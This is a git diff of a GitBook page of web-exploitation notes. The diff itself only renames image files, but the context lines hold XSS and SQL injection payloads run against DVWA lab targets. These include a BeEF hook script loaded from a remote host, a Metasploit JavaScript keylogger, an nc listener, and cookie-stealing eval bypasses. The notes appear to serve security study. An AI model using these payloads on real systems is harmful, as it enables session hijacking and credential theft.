@@ -106,13 +106,13 @@ app.listen(port, () => {
 {% endtab %}
 {% endtabs %}
 
-<figure><img src="../../../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (292).png" alt=""><figcaption></figcaption></figure>
 
 I will try use some tags to test rxss <mark style="color:red;">**`'"><h1>Hacked</h1>`**</mark>
 
 <mark style="color:blue;">**`the best`**</mark> **`'"><h1>Hacked</h1>{7*7}}JyI+PGgxPmhhY2tlZDwvaDE+`**
 
-<figure><img src="../../../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (293).png" alt=""><figcaption></figcaption></figure>
 
 Ok this search Vulnerable HTML injection &&  RXSS
 
@@ -122,9 +122,9 @@ Simple JS payload
 <script>alert('OSCP+EWAPTXv2')</script>
 ```
 
-<figure><img src="../../../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (294).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (295).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../../.gitbook/assets/ezgif-4-f7b8aedabd.gif" alt=""><figcaption></figcaption></figure>
 
@@ -297,7 +297,7 @@ in website&#x20;
 nc -nvlp 4444
 ```
 
-<figure><img src="../../../.gitbook/assets/image (14) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (310).png" alt=""><figcaption></figcaption></figure>
 
 ## How to Bypass Protection
 
@@ -475,11 +475,11 @@ IN DVWA DEMO
 http://192.168.2.5/dvwa/vulnerabilities/sqli/?id=1
 ```
 
-<figure><img src="../../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (296).png" alt=""><figcaption></figcaption></figure>
 
 i will use <mark style="color:red;">**`OR 6=6#`**</mark> to test &#x20;
 
-<figure><img src="../../../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (297).png" alt=""><figcaption></figcaption></figure>
 
 Ok i will Try Use union Attack
 
@@ -487,7 +487,7 @@ Ok i will Try Use union Attack
 1' union select 1,2#
 ```
 
-<figure><img src="../../../.gitbook/assets/image (2) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (298).png" alt=""><figcaption></figcaption></figure>
 
 Ok  Try again UNION Attack to make XSSSQi&#x20;
 
@@ -501,11 +501,11 @@ Make  Encoded to HEX && ad 0x in begin payload
 1' UNION SELECT 1,0x3c737667207372633d78206f6e6c6f61643d616c657274282f4833636b743030722f293e53#
 ```
 
-<figure><img src="../../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (299).png" alt=""><figcaption></figcaption></figure>
 
 B0000000000M!!
 
-<figure><img src="../../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (300).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -560,9 +560,9 @@ B0000000000M!!
 <script src="http://192.168.1.9:3000/hook.js"></script>
 ```
 
-<figure><img src="../../../.gitbook/assets/image (5) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (301).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (7) (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (303).png" alt=""><figcaption></figcaption></figure>
 
 [WriteUP](https://medium.com/@secureica/hooking-victims-to-browser-exploitation-framework-beef-using-reflected-and-stored-xss-859266c5a00a)
 
@@ -573,13 +573,13 @@ use auxiliary/server/capture/http_javascript_keylogger
 run
 ```
 
-<figure><img src="../../../.gitbook/assets/image (9) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (305).png" alt=""><figcaption></figcaption></figure>
 
 ### XSS Session Hijacking
 
 Stored XSS + Session Hijacking
 
-<figure><img src="../../../.gitbook/assets/image (10) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (306).png" alt=""><figcaption></figcaption></figure>
 
 Weak Session IDs Source&#x20;
 
@@ -637,11 +637,11 @@ in the code if last\_session exist make last\_session = 0
 ')-alert('a
 ```
 
-<figure><img src="../../../.gitbook/assets/image (11) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (307).png" alt=""><figcaption></figcaption></figure>
 
 Exploit using Arithmetic Operators
 
-<figure><img src="../../../.gitbook/assets/image (12) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (308).png" alt=""><figcaption></figcaption></figure>
 
 ```javascript
  /?user=')|eval('onload=a'.concat('lert(document.cookie)'))//
@@ -651,7 +651,7 @@ Exploit using Arithmetic Operators
 http://192.168.1.3/web/vulnapp.php%20/?user=%27)|eval(%27onload=a%27.concat(%27lert(document.cookie)%27))//#!
 ```
 
-<figure><img src="../../../.gitbook/assets/image (13) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (309).png" alt=""><figcaption></figcaption></figure>
 
 ```javascript
  /?user='),alert?.('document.cookie//
